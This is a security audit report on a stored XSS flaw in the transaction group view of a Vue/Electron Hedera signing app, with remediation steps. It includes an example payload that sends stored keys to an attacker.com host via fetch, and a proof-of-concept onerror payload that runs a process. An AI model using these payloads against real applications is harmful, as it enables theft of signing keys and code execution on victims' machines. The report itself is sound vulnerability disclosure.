Audit Report

## Title
`v-html` with Unsanitized User-Controlled Data Enables Stored XSS in Transaction Group View

## Summary
`CreateTransactionGroup.vue` uses Vue's `v-html` directive to render `groupItem.description` and `transactionMemo` — both user-controlled strings — without any sanitization. In organization mode, a malicious member can store an HTML/JS payload in a transaction group item's description field (persisted to the backend), which executes in any co-member's renderer process when they open the shared group.

## Finding Description

**Primary: `v-html` on unsanitized user data in `CreateTransactionGroup.vue`**

At lines 419–430, the template renders a `<div>` using `v-html` whose value resolves to one of several user-controlled strings: [1](#0-0) 

The expression evaluates (in priority order) to:

1. **`groupItem.description`** — free-text entered by any user when creating a transaction group item. Stored in the backend database and fetched by `handleLoadGroup()` via `transactionGroup.fetchGroup()`.
2. **`transactionMemo`** — the memo field decoded from `groupItem.transactionBytes`. An attacker can craft a Hedera transaction with an HTML payload in the memo and import it.

The `handleLoadGroup()` function fetches group data from the backend on mount, meaning any co-member who opens the group receives the attacker's stored payload: [2](#0-1) 

Neither `groupItem.description` nor `transactionMemo` is sanitized before being passed to `v-html`. No DOMPurify or equivalent is present.

Note: The `makeTransfer(index)` branch (Transfer Transaction path) is **not** exploitable — `formatHbarTransfers` only interpolates structured account IDs and numeric HBAR amounts: [3](#0-2) 

**Secondary: `AppStepper.vue` — `item.bubbleIcon` interpolated into HTML string rendered via `v-html`**

`getBubbleContent` interpolates the caller-supplied `item.bubbleIcon` prop directly into an HTML string: [4](#0-3) 

This string is then rendered via `v-html`: [5](#0-4) 

`bubbleIcon` is a prop passed from parent components. The only caller found is `TransactionDetailsStatusStepper.vue`. Whether `bubbleIcon` values originate from user-controlled backend data was not confirmed in this review — this secondary finding is lower confidence than the primary.

## Impact Explanation

This is an Electron desktop application. The renderer process runs in a Chromium context. Successful stored XSS in the renderer enables:

- **At minimum**: arbitrary JavaScript execution in the victim's renderer process, enabling exfiltration of locally stored private key material, session tokens, and organization credentials visible to the renderer.
- **Potentially RCE**: if `nodeIntegration: true` or `contextIsolation: false` is configured in `BrowserWindow` options (matches were found in `front-end/src/main/windows/mainWindow.ts` but the exact values were not confirmed in this review), the injected script gains full Node.js access — file system reads/writes, process spawning, and complete host compromise.

For a tool that manages Hedera signing keys and submits financial transactions, key exfiltration directly enables unauthorized asset transfers.

## Likelihood Explanation

Organization mode is an explicitly supported workflow where multiple users share transaction groups. Any authenticated organization member can:

- Create a transaction group item with a malicious `description` field (e.g., `<img src=x onerror="fetch('https://attacker.com/?k='+localStorage.getItem('keys'))">`).
- Import a crafted `.tx` file whose `transactionMemo` contains an HTML payload.

The victim only needs to open the shared group — a routine collaboration action. No social engineering beyond normal workflow is required. The attacker needs only a valid organization account.

## Recommendation

1. **Replace `v-html` with safe text interpolation** (`{{ }}`) wherever the content is not intentionally HTML. In `CreateTransactionGroup.vue` lines 421–429, `groupItem.description` and `transactionMemo` are plain text — use `{{ }}` binding instead of `v-html`.
2. **If HTML rendering is genuinely required**, sanitize all user-supplied strings with a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing them to `v-html`.
3. **For `AppStepper.vue`**, replace the string interpolation of `item.bubbleIcon` with a safe allowlist of known Bootstrap Icons class names, or use a `<i>` element with a bound `:class` attribute instead of `v-html`.
4. **Audit Electron `BrowserWindow` configuration** in `front-end/src/main/windows/mainWindow.ts` to confirm `contextIsolation: true` and `nodeIntegration: false` are set, limiting blast radius of any renderer-process XSS.

## Proof of Concept

**Attack vector via `groupItem.description`:**

1. Attacker (org member A) creates a new transaction group and adds a transaction item with `description` set to:
   ```html
   <img src=x onerror="require('child_process').exec('calc.exe')">
   ```
2. The group is saved to the backend via `transactionGroup.saveGroup()`.
3. Victim (org member B) navigates to the shared group. `onMounted` triggers `handleLoadGroup()`, which calls `transactionGroup.fetchGroup()` and populates `groupItems` with the attacker's data.
4. The template renders the `<div v-html="...">` at lines 419–430 with `groupItem.description` as the value.
5. The browser parses the injected HTML and executes the `onerror` handler in the renderer process. [6](#0-5) [1](#0-0)

```typescript
export function formatHbarTransfers(transfers: Transfer[]): string {
  if (transfers.length === 0) {
    return 'No transfers';
  }

  if (transfers.length === 1) {
    const amount = transfers[0].amount;
    if (amount.isNegative()) {
      return 'Missing receiver';
    } else {
      return 'Missing sender';
    }
  }

  if (transfers.length === 2) {
    // the JS SDK sorts the order of the transfers by account ID. We don't want this. We want the sender to be on the
    // left and the receiver to be on the right. So we need to check if the amount is negative or positive and then
    // arrange the transfers accordingly
    let sender = transfers[0];
    let receiver = transfers[1];
    if (receiver.amount.isNegative()) {
      sender = transfers[1];
      receiver = transfers[0];
    }
    return `${sender.accountId} --> ${stringifyHbarWithFont(receiver.amount)} --> ${receiver.accountId}`;
  }

  return 'Multiple transfers';
```
